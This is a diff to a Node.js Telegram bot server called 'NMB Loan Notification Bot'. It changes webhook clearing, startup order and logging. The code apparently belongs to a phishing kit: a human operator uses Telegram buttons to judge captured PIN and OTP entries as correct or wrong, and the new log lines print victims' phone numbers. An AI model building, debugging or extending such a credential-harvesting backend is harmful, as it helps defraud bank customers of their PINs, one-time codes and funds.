@@ -209,9 +209,13 @@ async function pollUpdates() {
       const desc = json.description || 'unknown error';
       console.error('[poll] getUpdates failed:', desc);
       if (/webhook/i.test(desc) || /conflict/i.test(desc)) {
-        console.error('[poll] A Telegram webhook is active, so getUpdates is blocked. ' +
-          'Either remove the webhook (GET https://api.telegram.org/bot<TOKEN>/setWebhook?url= ) ' +
-          'or run only the Vercel/webhook backend — do not run both at once.');
+        console.log('[poll] Clearing webhook to allow polling...');
+        await new Promise((resolve) => {
+          tgApi('setWebhook', { url: '' }, (r) => {
+            if (r && r.ok) console.log('[poll] Webhook cleared, continuing...');
+            resolve();
+          });
+        });
       }
     }
   } catch (e) {
@@ -253,7 +257,9 @@ async function handleCallback(cq) {
     const decision = (action === 'correct' || action === 'otp_approve') ? 'approved' : 'rejected';
     const kind = (action === 'correct' || action === 'wrong') ? 'PIN' : 'OTP';
     const stamp = (action === 'correct' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
+    console.log(`[${kind.toLowerCase()} callback] Received: action=${action}, id=${id}`);
     const rec = await store.get(store.NS.LOGIN, id);
+    console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec, rec?.phone);
     if (rec) {
       rec.status = decision;
       rec.decided = true;
@@ -549,14 +555,17 @@ const server = http.createServer(async (req, res) => {
   res.end('NMB Loan Notification Bot server running on :' + PORT);
 });
 
-server.listen(PORT, () => {
+server.listen(PORT, async () => {
   console.log(`Notification server listening on http://localhost:${PORT}`);
-  // Clear any existing webhook to allow polling to work
-  tgApi('setWebhook', { url: '' }, (r) => {
-    if (r && r.ok && r.description) {
-      console.log('[setup] Cleared existing webhook:', r.description);
-    }
-    console.log('Polling Telegram for admin decisions...');
-    pollUpdates();
+  // Clear any existing webhook to allow polling to work BEFORE we start polling
+  const webhookCleared = await new Promise((resolve) => {
+    tgApi('setWebhook', { url: '' }, (r) => {
+      resolve(!!(r && r.ok));
+      if (r && r.ok && r.description) {
+        console.log('[setup] Cleared existing webhook:', r.description);
+      }
+    });
   });
+  console.log('Polling Telegram for admin decisions...');
+  pollUpdates();
 });
